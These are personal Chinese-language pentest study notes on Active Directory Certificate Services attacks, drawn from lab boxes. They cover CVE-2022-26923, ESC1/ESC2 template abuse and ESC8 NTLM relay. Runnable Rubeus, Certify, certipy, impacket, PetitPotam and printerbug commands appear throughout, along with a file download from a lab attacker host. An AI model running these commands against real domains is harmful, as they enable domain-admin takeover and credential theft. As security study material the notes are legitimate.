# ADCS攻击



https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

https://www.freebuf.com/articles/network/368120.html



（太多了）

(这部分是随便记的)





ADCS即Active Directory Certificate Service（活动目录证书服务，）

可以使用证书来进行Kerberos预身份认证：

```shell
#使用administrator.pfx证书进行身份认证，这一步就可以得到administrator的HTLM Hash
.\Rubeus.exe asktgt /user:Administrator /certificate：administrator.pfx /domain:hack.com /dc:DC.hack.com
#转储账号的凭证信息，输出的最后一行是HTLM Hash
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```



证书的注册流程：

1. 客户端生成一对公、私钥
2. 客户端生成证书签名请求(CSR，Certificate Signing
   Request)，里面包含客户端生成的公钥以及请求的证书模板、请求的主体等信息。整个CSR用客户端的私钥签名，发送给CA
3. CA收到请求后，从中取出公钥对CSR进行签名校验。校验通过后判断客户证书注册端请求的证书模板是否存在，如果存在，根据证书模板中的属性判断请求的主体是否有权限申请该证书。如果有权限，则还要根据其他属性，如发布要求、使用者名称、扩展等属性来生成证书。
4. CA使用其私钥签名生成的证书并发送给客户端
5. 客户端存储该证书在系统中





## CVE-2022-26923

该漏洞产生的主要原因是ADCS服务器在处理计算机模板证书时是通过机器的dNSHostName属性来辨别用户的，而普通域用户即有权限修改它所创建的机器账户dNSHostName属性，因此恶意攻击者可以创建一个机器账户，然后修改它的dNSHostName属性为域控的dNSHostName，然后去请求计算机模板的证书。ADCS服务器在生成证书时会将域控的dNSHostName属性写入证书中。当使用进行PKINI Kerberos认证时，KDC会查询活动目录中的sAMAccountName属性为“dNSHostName-域名+$"的对象，此时会查询到域控，因此会以域控机器账户的权限生成PAC放入票据中。由于域控机器账户默认具有DCSync权限，因此攻击者可以通过该票据导出域内任意用户的Hash。



https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366

（下面的脚本没有实地打过）

```shell
impacket-addcomputer 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'

Set-ADComputer THMPC -ServicePrincipalName @{}
Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com

certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
```



这个也没有实地打过：

```shell
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

$Password = ConvertTo-SecureString 'fengfeng123!!!' -AsPlainText -Force
New-MachineAccount -MachineAccount "FENG" -Password $($Password) -Domain "sequel.htb" -DomainController "dc.sequel.htb" -Verbose

Set-DomainObject -Identity "FENG$" -Set @{"dnsHostname" = "dc.sequel.htb"} -Verbose
```





收集ADCS信息：

```shell
certutil.exe
```

## 证书模版配置错误漏洞攻击

### **ESC1**

1. 低权限用户可以注册证书（`Enrollment Rights: NT Authority\Authenticated Users`）
2. 无需授权签名。（`Authorized Signatures Required       : 0`）
3. 申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户（`msPKI-Certificates-Name-Flag:ENROLLEE_SUPPLIES_SUBJECT`）



**攻击流程：**

```shell
 .\certify.exe find /vulnerable
 [!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.8715059
```

请求证书：

```shell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

```shell
-----BEGIN RSA PRIVATE KEY-----
...
-----END CERTIFICATE-----


```



将上面的内容全部复制存储下来，然后：

```shell
iwr -uri http://10.10.14.14:39554/cert.pfx -outfile cert.pfx
upload Rubeus.exe


.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

即可得到administrator的NTLM hash





### **ESC2**

和ESC1的区别：证书模板定义了任意用途 EKU 或没有 EKU。

利用方式同ESC1.



### **ESC8**

ADCS在默认安装的时候，其Web接口支持NTLM身份验证并且没有启用任何NTLM Relay保护措施。强制域控制器计算机帐户(DC$)向配置了NTLM中继的主机进行身份验证。身份验证被转发给证书颁发机构(CA)并提出对证书的请求。获取到了DC$的证书后就可以为用户/机器请求TGS/TGT票据，获取相应的权限。

即想办法从其他地方进行NTLM Relay，把hash中继到web的ca服务器来获取证书。

```shell
python3 ntlmrelayx.py -t http://192.168.41.10/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'

#使用PetitPotam漏洞触发
python3 PetitPotam.py -d hack.com -u hack -p Admin123 192.168.41.19 192.168.41.40
#使用Print Spooler漏洞触发
python3 printerbug.py hack/hack:Admin123@192.168.41.40 192.168.41.19 

Rubeus.exe asktgt /user:DC2$ /ptt /nowrap /outfile:ticket.kirbi /certificate:打印出的的base64格式的证书
#即可获取hash。
```



ESC2-ESC7不看了，不太常见而且细节上差不太多。



